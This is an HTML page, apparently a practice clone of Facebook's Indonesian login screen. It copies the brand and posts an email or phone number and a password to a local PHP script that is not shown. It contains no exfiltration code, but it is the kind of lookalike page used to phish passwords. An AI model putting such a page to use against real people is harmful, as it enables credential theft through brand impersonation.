<!DOCTYPE html>
<html lang="id">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Facebook Login Clone</title>
    <link rel="stylesheet" href="style.css" />
  </head>
  <body>
    <div class="container">
      <div class="left">
        <h1 style="color: #1877f2">facebook</h1>
        <p>
          Facebook membantu Anda terhubung dan berbagi dengan orang-orang dalam
          kehidupan Anda.
        </p>
      </div>

      <div class="right">
        <div class="login-box">
          <form action="proses_login.php" method="POST">
            <input
              type="text"
              name="username"
              placeholder="Email atau Nomor Telepon"
              required
            />
            <div style="position: relative">
              <input
                type="password"
                name="password"
                id="password"
                placeholder="Kata Sandi"
                required
              />
              <span
                onclick="togglePassword()"
                style="
                  position: absolute;
                  top: 16px;
                  right: 16px;
                  cursor: pointer;
                  color: #aaa;
                "
                >üëÅÔ∏è</span
              >
            </div>
            <input type="submit" value="Masuk" />
          </form>
          <a href="#">Lupa kata sandi?</a>
          <hr />
          <button class="create-btn">Buat akun baru</button>
        </div>

        <div class="footer">
          <p><b>Buat Halaman</b> untuk selebriti, merek, atau bisnis.</p>
        </div>
      </div>
    </div>

    <script>
      function togglePassword() {
        const input = document.getElementById("password");
        input.type = input.type === "password" ? "text" : "password";
      }
    </script>
  </body>
</html>
